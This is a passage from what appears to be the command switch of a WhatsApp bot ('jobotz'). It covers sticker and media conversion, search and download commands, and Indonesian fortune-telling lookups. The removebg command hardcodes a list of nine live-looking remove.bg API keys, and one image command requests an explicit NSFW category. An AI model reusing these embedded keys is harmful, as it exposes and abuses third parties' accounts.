           await jobotz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'jobotz', 'morou', m, {asSticker: true})

         }
         break
        case 'attp':
        if (!isCreator) return
 try {
if (args.length == 0) return m.reply(`Example: ${prefix + command} YUjobotz`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await jobotz.sendMessage(m.chat, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
 console.log(e)
 m.reply(`Maap sedang error coba lagi besok`)            
}
break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       if (!isCreator) return
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await jobotz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    jobotz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
	        if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await jobotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            jobotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            jobotz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${jobotz.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            jobotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await jobotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isCreator) return
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
            if (!isCreator && !isBan) return
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await jobotz.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    jobotz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `│➳ No : ${no++}\n│➳ Type : ${i.type}\n│➳ Video ID : ${i.videoId}\n│➳ Title : ${i.title}\n│➳ Views : ${i.views}\n│➳ Duration : ${i.timestamp}\n│➳ Upload At : ${i.ago}\n│➳ Author : ${i.author.name}\n│➳ Url : ${i.url}\n\n─────────────────\n\n`
                }
                jobotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `│➳ *Title* : ${g.title}\n`
                teks += `│➳ *Description* : ${g.snippet}\n`
                teks += `│➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!isCreator && !isBan) return
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
╭━═════════════━•
│➳ Title : ${anu.title}
│➳ Ext : Search
│➳ ID : ${anu.videoId}
│➳ Duration : ${anu.timestamp}
│➳ Viewers : ${anu.views}
│➳ Upload At : ${anu.ago}
│➳ Author : ${anu.author.name}
│➳ Channel : ${anu.author.url}
│➳ Description : ${anu.description}
│➳ Url : ${anu.url}
╰━═════════════━•`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
	    if (!isCreator) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
            if (!isCreator) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
	    if (!isCreator && !isBan) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
            if (!isCreator && !isBan) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
            if (!isCreator && !isBan) return
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                jobotz.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                m.reply(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
	    if (!isCreator && !isBan) return
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                jobotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                jobotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            if (!isCreator && !isBan) return
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `│➳ Title : ${result.title}\n│➳ Category : ${result.type}\n│➳ Detail : ${result.source}\n│➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `│➳ Title : ${result.title}\n│➳ Source : ${result.source}\n│➳ Media Url : ${result.image}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
            if (!isCreator && !isBan) return
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
	        if (!isCreator && !isBan) return
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
	    if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
	    if (!isCreator && !isBan) return
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Life Path :* ${anu.message.life_path}\n│➳ *Destiny :* ${anu.message.destiny}\n│➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│➳ *Personality :* ${anu.message.personality}\n│➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator && !isBan) return
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Rezeki :* ${anu.message.rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Sektor :* ${anu.message.sektor}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
